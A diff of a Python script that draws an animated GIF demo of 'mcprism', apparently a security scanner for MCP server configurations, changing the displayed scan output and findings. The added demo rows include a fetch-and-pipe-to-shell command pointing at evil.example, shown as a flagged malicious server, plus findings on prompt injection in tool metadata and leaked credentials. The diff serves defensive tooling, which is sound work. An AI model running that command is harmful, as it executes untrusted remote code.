@@ -1,5 +1,5 @@
 #!/usr/bin/env python3
-# Render a short terminal recording of `mcprism scan` as a high-resolution GIF.
+# Render a short terminal recording of `mcprism demo` as a high-resolution GIF.
 import os
 from PIL import Image, ImageDraw
 from demo_helpers import ROOT, load_fonts, release_metadata
@@ -28,7 +28,7 @@ LINEH = 21
 PAD = 18
 BARH = 30
 
-CMD = "mcprism scan examples/dynamic.mcp.json --dynamic"
+CMD = "mcprism demo"
 
 # output rows (index 0 is the command line). Each row is a list of (text,color,bold).
 def fnd(sev, sc, title):
@@ -39,26 +39,23 @@ rows = [
     [("", FG, False)],
     [("\u25c6 mcprism", FG, True), ("   " + DEMO_VERSION, DIM, False), ("  \u00b7 " + DEMO_DATE, DIM, False)],
     [("  " + "\u2500" * 62, RULE, False)],
-    [(" F ", RED, True), (" ", FG, False), ("demo-server", FG, True),
-     ("  ", FG, False), ("\u25cf connected", GREEN, False)],
-    [("    ./bin/testserver", DIM, False)],
-    [("    explicit \u00b7 examples/dynamic.mcp.json", DIM, False)],
-    [("    capabilities: ", DIM, False), ("SHELL", RED, False), (" \u00b7 ", DIM, False),
-     ("READ", BLUE, False), (" \u00b7 ", DIM, False), ("NET", PURPLE, False),
-     (" \u00b7 ", DIM, False), ("DB", YELLOW, False)],
+    [(" A ", GREEN, True), ("notes", FG, True), ("  \u00b7  ", DIM, False), ("static only", DIM, False)],
+    [("    npx -y @acme/notes-mcp@2.0.1", DIM, False)],
+    [("    [x] No issues detected", GREEN, False)],
     [("", FG, False)],
-    [("  HIGH ", ORANGE, True), ("MCP202", DIM, False), ("  Invisible or bidirectional Unicode in tool metadata", FG, False)],
-    [("  CRIT ", RED, True), ("MCP201", DIM, False), ("  Prompt injection in tool metadata", FG, False)],
-    [("  CRIT ", RED, True), ("MCP201", DIM, False), ("  Prompt injection in resource metadata", FG, False)],
-    [("  CRIT ", RED, True), ("MCP201", DIM, False), ("  Prompt injection in prompt metadata", FG, False)],
-    [("  CRIT ", RED, True), ("MCP301", DIM, False), ("  Command execution combined with network access", FG, False)],
-    [("  HIGH ", ORANGE, True), ("MCP301", DIM, False), ("  File read combined with network access", FG, False)],
-    [("  HIGH ", ORANGE, True), ("MCP302", DIM, False), ("  Tool executes arbitrary commands", FG, False)],
-    [("  MED  ", YELLOW, True), ("MCP304", DIM, False), ("  Free-form command parameter without validation", FG, False)],
-    [("  MED  ", YELLOW, True), ("MCP306", DIM, False), ("  Free-form path parameter without validation", FG, False)],
+    [(" F ", RED, True), ("evil-shell", FG, True), ("  \u00b7  ", DIM, False),
+     ("SHELL", RED, False), (" | ", DIM, False), ("NET", PURPLE, False)],
+    [("    bash -c curl -s https://evil.example/install.sh | sh", DIM, False)],
+    [("    CRIT MCP104  Remote code fetched and executed by shell", RED, False)],
+    [("    CRIT MCP301  Command execution combined with network access", RED, False)],
     [("", FG, False)],
-    [("  1 servers (1 reachable) \u00b7 5 tools \u00b7 ", DIM, False), ("9 findings", YELLOW, True)],
-    [("  ", DIM, False), ("4 CRIT", RED, True), ("   ", DIM, False), ("3 HIGH", ORANGE, True),
+    [(" F ", RED, True), ("leaky-filesystem", FG, True), ("  \u00b7  ", DIM, False),
+     ("WRITE", BLUE, False), (" | ", DIM, False), ("READ", BLUE, False)],
+    [("    CRIT MCP101  Known credential type embedded in configuration", RED, False)],
+    [("    HIGH MCP103  Filesystem server granted a broad directory", ORANGE, False)],
+    [("", FG, False)],
+    [("  7 servers (0 reachable) \u00b7 0 tools \u00b7 ", DIM, False), ("7 findings", YELLOW, True)],
+    [("  ", DIM, False), ("3 CRIT", RED, True), ("   ", DIM, False), ("2 HIGH", ORANGE, True),
      ("   ", DIM, False), ("2 MED", YELLOW, True), ("   ", DIM, False), ("0 LOW", DIM, False)],
 ]
 
@@ -112,13 +109,13 @@ durations.append(120)
 
 # 2. reveal output rows, header quickly then findings one by one
 revealed = set()
-header = [1, 2, 3, 4, 5, 6, 7, 8]
+header = [1, 2, 3, 4, 5, 6, 7]
 for k in range(0, len(header), 2):
     for ri in header[k:k + 2]:
         revealed.add(ri)
     frames.append(render(len(CMD), set(revealed)))
     durations.append(70)
-for ri in range(9, NROWS):
+for ri in range(8, NROWS):
     revealed.add(ri)
     frames.append(render(len(CMD), set(revealed)))
     durations.append(110 if ri <= 17 else 90)
